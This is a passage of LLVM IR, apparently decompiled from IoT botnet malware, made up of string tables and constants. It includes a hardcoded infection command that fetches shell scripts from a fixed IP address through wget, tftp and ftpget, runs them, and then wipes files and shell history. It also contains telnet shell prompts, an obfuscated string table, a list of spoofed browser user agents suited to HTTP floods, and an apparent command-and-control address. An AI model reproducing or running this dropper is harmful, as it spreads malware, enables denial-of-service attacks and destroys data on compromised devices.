@global_var_1c2cc.270, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c2d8.271, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c2e4.272, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c2f0.273, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c2f0.273, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c2fc.274, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c2fc.274, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c304.275, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c310.276, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c31c.277, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c324.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c330.279, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c338.280, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c344.281, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c350.282, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbb4.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c35c.283, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c364.284, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c370.285, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbf8.107, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c378.286, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c378.286, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c380.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c388.288, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c390.289, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c398.290, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c3a4.291, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c3b4.292, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c3c0.293, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c3d0.294, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c3e0.295, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c3e8.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c3f4.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbf0.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c3fc.298, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c404.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c40c.300, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1c414.301, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c424.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c430.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc20.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c438.304, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbe8.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c440.305, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c380.287, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c448.306, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bc48.115, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c450.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c460.308, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c450.307, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1c460.308, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c470.309, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c478.310, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c480.311, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1be7c.169, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c48c.312, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c498.313, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c4a0.314, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4ac.315, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c4b8.316, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4c4.317, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c4d0.318, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4d8.319, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c4e4.320, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4ec.321, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c4f8.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c504.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c504.323, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c50c.324, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bc48.115, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c518.325, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c520.326, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c528.327, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c530.328, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c53c.329, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c544.330, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c54c.331, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c554.332, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c430.303, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbe8.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c440.305, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c55c.333, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c568.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c570.335, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1be08.158, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bc20.111, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c578.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bfd0.200, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c580.337, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc10.109, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c588.338, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c590.339, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c59c.340, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c5a4.341, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c084.216, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c5ac.342, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c5b4.343, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c5bc.344, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c5c4.345, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bfd0.200, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c5d0.346, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c5d8.347, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c5e0.348, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c5e8.349, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bc74.119, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1bbc4.101, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c568.334, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1bd00.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c5f4.350, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c0f4.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c600.351, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c60c.352, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c5d8.347, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c618.353, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbd0.102, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c620.354, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc10.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bc10.109, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c628.355, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c630.356, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c638.357, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c644.358, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c650.359, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1bbb4.99, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c658.360, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c664.361, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c670.362, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c67c.363, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c688.364, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bc54.116, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c694.365, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1c6a4.366, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c6b4.367, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c3b4.292, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c3b4.292, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1c6c0.368, i32 0, i32 0)]
@global_var_27664.375 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c748.55, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c750.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c758.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c764.58, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1c76c.59, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c774.60, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1c77c.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1c780.50, i32 0, i32 0), i8* bitcast (i32* @global_var_1c788.51 to i8*), i8* bitcast (i32* @global_var_1c78c.52 to i8*)]
@global_var_1cbc8.378 = constant i32 993090331
@global_var_1cc28.380 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1cc30.382 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1b9f8.384 = constant [443 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.150.230/bassboots.sh; chmod 777 bassboots.sh; sh bassboots.sh; tftp 188.166.150.230 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; tftp -r ktftp2.sh -g 188.166.150.230; chmod 777 ktftp2.sh; sh ktftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 188.166.150.230 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bassboots.sh ktftp1.sh ktftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00"
@global_var_269e8.385 = local_unnamed_addr global [443 x i8]* @global_var_1b9f8.384
@global_var_1cc38.387 = constant [6 x i8] c"arfgG\00"
@global_var_1cc40.388 = constant [9 x i8] c"HBiug655\00"
@global_var_1cc4c.389 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1cc5c.390 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1cc70.391 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1cc84.392 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1cc90.393 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1cc9c.394 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1cca8.395 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1ccb4.396 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1ccc0.397 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1ccd0.398 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1ccdc.399 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1ccec.400 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1ccf8.401 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1cd08.402 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1cd14.403 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1cd20.404 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1cd2c.405 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1cd3c.406 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1cd4c.407 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1cd5c.408 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1cd68.409 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1cd78.410 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1cd88.411 = constant [12 x i8] c"yteytietyue\00"
@global_var_1cd94.412 = constant [9 x i8] c"qsortEQS\00"
@global_var_1cda0.413 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1cdb0.414 = constant [4 x i8] c"std\00"
@global_var_1cdb4.415 = constant [4 x i8] c"dts\00"
@global_var_1cdb8.416 = constant [4 x i8] c"lsk\00"
@global_var_1cdbc.417 = constant [4 x i8] c"kek\00"
@global_var_1cdc0.418 = constant [6 x i8] c"smack\00"
@global_var_1cdc8.419 = constant [4 x i8] c"ily\00"
@global_var_1cdcc.420 = constant [4 x i8] c"tyf\00"
@global_var_1cdd0.421 = constant [4 x i8] c"pos\00"
@global_var_1cdd4.422 = constant [6 x i8] c"cunts\00"
@global_var_1cddc.423 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cc38.387, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cc40.388, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1cc4c.389, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1cc5c.390, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1cc70.391, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cc84.392, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cc90.393, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cc9c.394, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1cca8.395, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ccb4.396, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ccc0.397, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ccd0.398, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ccdc.399, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ccec.400, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ccf8.401, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1cd08.402, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd14.403, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd20.404, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd2c.405, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd3c.406, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd4c.407, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1cd5c.408, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd68.409, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1cd78.410, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1cd88.411, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1cd94.412, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1cda0.413, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdb0.414, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdb4.415, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdb8.416, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdbc.417, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdc0.418, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdc8.419, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdcc.420, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1cdd0.421, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1cdd4.422, i32 0, i32 0)]
@global_var_1ad08.427 = constant [64 x i8] c"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1ad48.428 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1ad8c.429 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1add0.430 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1ae14.431 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1ae58.432 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1ae9c.433 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1aee0.434 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1af50.435 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1afc4.436 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1b010.437 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_1b098.438 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1b0e4.439 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_1b154.440 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1b1c4.441 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_1b238.442 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_1b2b0.443 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1b2f8.444 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1b328.445 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1b368.446 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1b3b4.447 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1b42c.448 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1b49c.449 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1b50c.450 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1b580.451 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1b614.452 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1b65c.453 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1b6a4.454 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1b6e4.455 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_1b760.456 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1b7c8.457 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_1b844.458 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1b894.459 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_1b8e8.460 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1b93c.461 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1b990.462 = constant [83 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0\00"
@global_var_1b9e4.463 = constant [20 x i8] c"188.166.150.230:123\00"
@global_var_26954.464 = global [37 x i8*] [i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1ad08.427, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @global_var_1ad48.428, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ad8c.429, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1add0.430, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ae14.431, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ae58.432, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1ae9c.433, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1aee0.434, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1af50.435, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1afc4.436, i32 0, i32 0), i8* getelementptr inbounds ([135 x i8], [135 x i8]* @global_var_1b010.437, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b098.438, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_1b0e4.439, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @global_var_1b154.440, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1b1c4.441, i32 0, i32 0), i8* getelementptr inbounds ([117 x i8], [117 x i8]* @global_var_1b238.442, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1b2b0.443, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1b2f8.444, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1b328.445, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1b368.446, i32 0, i32 0), i8* 